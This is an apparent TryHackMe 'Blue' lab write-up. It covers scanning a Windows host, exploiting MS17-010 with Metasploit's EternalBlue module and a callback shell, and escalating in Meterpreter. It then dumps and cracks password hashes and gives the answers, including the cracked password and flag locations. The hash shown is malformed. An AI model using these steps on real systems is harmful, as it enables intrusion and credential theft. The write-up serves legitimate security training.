# 🔒 Cybersecurity Lab Report  
**Platform:** TryHackMe  
**Lab:** Blue  
**Difficulty:** 🟢 Easy  
**Time Estimate:** ⏱️ 30 minutes  

---

## 📌 Table of Contents
- [Overview](#-overview)
- [Recon](#-recon)
- [Gain Access](#-gain-access)
- [Escalation](#-escalation)
- [Cracking](#-cracking)
- [Flags](#-flags)
- [Notes & Observations](#-notes--observations)

---

## 📖 Overview  
This report documents the process of completing the **Blue** lab on TryHackMe.  
The objective was to identify vulnerabilities, exploit the target, escalate privileges, crack credentials, and retrieve system flags.  

---

## 🔍 Recon  
**Task:** Scan the machine.  

I used a custom script I created to automate scanning the target system for vulnerabilities:

```bash
sudo ./grayscan.sh 10.201.120.38

[*] Starting scan... targeting common ports and vulnerabilities
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 21:34 PST
Nmap scan report for 10.201.120.38
Host is up (0.34s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|*smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|*      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.71 seconds

[*] Scan complete! Now checking for common vulnerabilities...

--- Possible Vulnerabilities ---
Port 135: No common beginner-friendly vulns in cheat sheet
Port 139: SMB: Null session, EternalBlue (MS17-010)
Port 445: SMB: SMBv1 RCE, EternalBlue, WannaCry

[*] Full scan saved to scan_results.txt
```

- **Q1:** How many ports are open with a port number under 1000?  
  **Answer:** 3  

- **Q2:** What is this machine vulnerable to?  
  **Answer:** Microsoft SMBv1 servers (MS17-010)  

---

## 🎯 Gain Access  
**Task:** Find and run the exploitation code against the machine.  

- **Q:** What is the name of the required value when setting options in Metasploit?  
  **Answer:** LHOST and RHOSTS  

**Steps Taken:**  
```bash
msfconsole
search ms17
use exploit/windows/smb/ms17_010_eternalblue
show options
set LHOST <attacker-ip>
set RHOSTS <target-ip>
run
```

**Documentation:**  
First, I launched Metasploit using `msfconsole`. Based on the Nmap scan results, I searched for and selected the `ms17_010_eternalblue` exploit. Then, I set the required options:  
- `LHOST` → my attacking machine’s IP address  
- `RHOSTS` → the target machine’s IP address  

Finally, I executed the exploit to gain access.  

---

## 🚀 Escalation  
**Task:** Convert the shell to Meterpreter, escalate privileges, and stabilize the session.  

- **Q1:** Verify escalation with `getsystem` and `whoami`.  
  **Answer:** I used `getuid` in Meterpreter, and the system was running as `NT AUTHORITY\SYSTEM`.  

- **Q2:** Identify a SYSTEM process ID.  
  **Answer:** The SYSTEM process ID was **1208**.  

- **Q3:** Migrate to that process.  
  **Answer:** `migrate 1208`  

**Steps Taken:**  
```bash
help
getuid
migrate 1208
```

**Documentation:**  
While inside Meterpreter, I used the `help` command to view available options. Running `getuid` confirmed the session was running as `NT AUTHORITY\SYSTEM`. I then located the process ID for `spoolsv.exe` (PID 1208) and migrated to it using `migrate 1208`.  

---

## 🔑 Cracking  
**Task:** Dump and crack password hashes.  

- **Q1:** What is the name of the non-default user?  
  **Answer:** Jon  

- **Q2:** What is the cracked password?  
  **Answer:** alqfna22  

**Steps Taken:**  
```bash
hashdump
echo "8a0384b8sad94219230" > crack.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
alqfna22
```

**Documentation:**  
Inside Meterpreter, I used `hashdump` to list users and password hashes. The target user was **Jon**. I copied the hash into a file (`crack.txt`). Using John the Ripper with the RockYou wordlist, I successfully cracked the hash, revealing the password `alqfna22`.  

---

## 🚩 Flags  

- **Q1:** Flag1 (system root)  
  **Answer:** Located in `C:/`  

- **Q2:** Flag2 (Windows password storage)  
  **Answer:** Located in `C:/Windows/System32/Config`  

- **Q3:** Flag3 (Administrator’s files)  
  **Answer:** Located in `C:/Users/Jon/Documents`  

**Steps Taken:**  
```bash
cd C:/
ls
cat flag1.txt

cd Windows/System32/Config
ls
cat flag2.txt

cd Users/Jon/Documents
ls
cat flag3.txt
```

---

## 📌 Notes & Observations  
Lessons learned from this lab:  
- I practiced using Nmap and enhanced efficiency by creating an automated scan script (`grayscan.sh`). Initially, my scans took nearly an hour, but by limiting the scan to common ports and increasing the timing template (`-T4`), I significantly reduced the scan time.  
- I became more comfortable navigating and using Metasploit modules. While my current understanding is still at a surface level, I now have a clearer idea of how exploits and options are configured.  
- I also gained hands-on experience with John the Ripper for password cracking.  

These skills are valuable for both penetration testing and defensive security roles.  

---

✅ *End of Lab Report*  
